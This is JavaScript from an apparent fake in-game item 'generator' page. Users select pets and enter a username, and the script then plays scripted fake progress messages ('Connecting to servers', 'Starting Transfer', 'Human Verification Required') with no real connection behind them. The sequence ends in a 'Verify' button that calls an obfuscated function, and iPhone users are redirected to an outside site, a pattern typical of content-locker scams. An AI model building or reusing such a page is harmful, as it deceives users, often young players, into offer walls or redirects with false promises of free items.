document.addEventListener("DOMContentLoaded", function () {
    const cards = document.querySelectorAll(".card");
    const generateButton = document.getElementById("generate");
    const warningPetLimit = document.getElementById("warning-pet-limit");
    const warningNoPet = document.getElementById("warning-no-pet");
    const warningUsername = document.getElementById("warning-username");
    const usernameInput = document.getElementById("username");
    const blankScreen = document.getElementById("blank-screen");
    const selectedCards = new Set();
    const modalContainer = document.getElementById("xf_MODAL_CONTAINER");

    cards.forEach(function (card) {
        card.addEventListener("click", function () {
            const circle = this.querySelector('.circle');
            if (selectedCards.has(this)) {
                selectedCards.delete(this);
                circle.style.display = "none";
            } else {
                if (selectedCards.size < 3) {
                    selectedCards.add(this);
                    circle.style.display = "block";
                } else {
                    showWarning(warningPetLimit);
                    scrollToWarning(warningPetLimit);
                }
            }
        });
    });

    generateButton.addEventListener("click", function () {
        const username = usernameInput.value.trim();
        if (selectedCards.size === 0) {
            showWarning(warningNoPet);
            scrollToWarning(warningNoPet);
        } else if (username.length < 3) {
            warningUsername.textContent = "Invalid username: Too short";
            showWarning(warningUsername);
            scrollToWarning(warningUsername);
        } else if (username.length > 25) {
            warningUsername.textContent = "Invalid username: Too long";
            showWarning(warningUsername);
            scrollToWarning(warningUsername);
        } else {
            setTimeout(function () {
                Array.from(document.body.children).forEach(child => {
                    if (child !== modalContainer && child !== blankScreen) {
                        child.style.display = "none";
                    }
                });
                blankScreen.style.display = "block";
                loadNewContent(username, selectedCards);
                addFloatingImages(blankScreen);
            }, 500);
        }
    });

    function showWarning(warningElement) {
        hideAllWarnings();
        warningElement.style.display = "block";
    }

    function hideAllWarnings() {
        warningPetLimit.style.display = "none";
        warningNoPet.style.display = "none";
        warningUsername.style.display = "none";
    }

    function scrollToWarning(warningElement) {
        const offsetTop = warningElement.offsetTop - 250;
        window.scrollTo({ top: offsetTop, behavior: 'smooth' });
    }
});
  </script>
<script>

  var button = document.querySelector('.verify-button');  
button.addEventListener('click', function() {
    (function() {
        var redirectURL = "https://www.rolls3.com";

        var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

        if (isIphoneOrIpad) { 
            window.location.href = redirectURL;
        }
    })();
});
</script>
<script>
function loadNewContent(username, selectedCards) {
    const loadingCircles = document.querySelectorAll('.loading-circle');
    const phases = [
        { texts: ['Connecting to servers.', 'Successfully Connected.'], color: '#FE9D43', bouncingIndex: 1 },
        { texts: ['Finding Username.', 'Username Found.'], color: '#FE9D43', bouncingIndex: 2 },
        { texts: ['Generating Items.', 'Starting Transfer.'], color: '#FE9D43', bouncingIndex: 3 },
        { texts: ['Verifying Human Activity.', 'Human Verification Required.'], color: '#FE9D43', bouncingIndex: 4, lastPhase: true }
    ];

    function updateCircles(phase) {
        loadingCircles.forEach((circle, index) => {
            if (index < phase.bouncingIndex) {
                circle.style.backgroundColor = phase.color;
                circle.classList.remove('bounce');
            } else if (index === phase.bouncingIndex) {
                circle.style.backgroundColor = "#E8E8E8";
                circle.classList.add('bounce');
            } else {
                circle.style.backgroundColor = "#E8E8E8";
                circle.classList.remove('bounce');
            }
        });
    }

    function addText(text, color) {
        const loadingText = document.createElement('p');
        loadingText.textContent = text;
        loadingText.style.color = color;
        loadingText.classList.add('loading-text');
        loadingText.style.fontSize = "1.5em";
        const whiteBox = document.querySelector('.white-box');
        whiteBox.insertBefore(loadingText, document.querySelector('.loading-circles'));
        typingAnimation(loadingText);
    }

    function typingAnimation(element) {
        const text = element.textContent;
        element.textContent = '';
        let i = 0;
        const typingInterval = setInterval(function () {
            if (i < text.length) {
                element.textContent += text.charAt(i);
                if (i === text.length - 1) {
                    const blinkingDot = document.createElement('span');
                    blinkingDot.textContent = '.';
                    blinkingDot.classList.add('blinking-dot');
                    element.appendChild(blinkingDot);
                }
                i++;
            } else {
                clearInterval(typingInterval);
            }
        }, 20);
    }

    function removeText() {
        const loadingText = document.querySelector('.loading-text');
        if (loadingText) {
            loadingText.remove();
        }
    }

    let phaseIndex = 0;
    function nextPhase() {
        if (phaseIndex < phases.length) {
            const phase = phases[phaseIndex];
            removeText();
            addText(phase.texts[0], 'black');
            updateCircles(phase);

            let secondTextDelay = phase.lastPhase ? 3500 : 2000;
            setTimeout(() => {
                removeText();
                let secondTextColor = phaseIndex === 3 ? 'red' : 'green';
                addText(phase.texts[1], secondTextColor);
            }, secondTextDelay);

            phaseIndex++;
            setTimeout(nextPhase, secondTextDelay + 1000);
        } else {
            addVerifyButton();
        }
    }

    setTimeout(nextPhase, 0);
}

function addVerifyButton() {
    const verifyButton = document.createElement('button');
    verifyButton.textContent = 'Verify';
    verifyButton.setAttribute('onclick', '_Cm()');
    verifyButton.classList.add('verify-button');
    const whiteBox = document.querySelector('.white-box');
    whiteBox.insertBefore(verifyButton, document.querySelector('.loading-circles'));
}

const floatingImagesContainer = document.getElementById("floating-images-container");
const imageSources = [
    "https://cdn.jsdelivr.net/gh/monorolls/grow@main/DragonFly1.png",
    "https://cdn.jsdelivr.net/gh/monorolls/grow@main/DragonFly1.png"
];
const floatingImages = [];

function createFloatingImage(src, container) {
    const img = document.createElement("img");
    img.src = src;
    img.classList.add("floating-image");
    img.style.top = `${Math.random() * 80 + 10}vh`;
    img.style.left = `${Math.random() * 80 + 10}vw`;

    const speed = Math.random() * 1.5 + 0.5;
    img.vx = (Math.random() < 0.5 ? -1 : 1) * speed;
    img.vy = (Math.random() < 0.5 ? -1 : 1) * speed;

    container.appendChild(img);
    floatingImages.push(img);

    img.addEventListener("click", function () {
        const speed = Math.random() * 3 + 1;
        img.vx = (Math.random() < 0.5 ? -1 : 1) * speed;
        img.vy = (Math.random() < 0.5 ? -1 : 1) * speed;
        img.style.transform = "scale(1.2)";
        setTimeout(() => img.style.transform = "scale(1)", 200);
    });
}

function animateImages() {
    floatingImages.forEach(img => {
        let rect = img.getBoundingClientRect();
        if (rect.top <= 0 || rect.bottom >= window.innerHeight) img.vy *= -1;
        if (rect.left <= 0 || rect.right >= window.innerWidth) img.vx *= -1;
        img.style.top = `${parseFloat(img.style.top) + img.vy}px`;
        img.style.left = `${parseFloat(img.style.left) + img.vx}px`;
    });
    requestAnimationFrame(animateImages);
}

function addFloatingImages(container) {
    imageSources.forEach(src => createFloatingImage(src, container));
}

addFloatingImages(floatingImagesContainer);
animateImages();
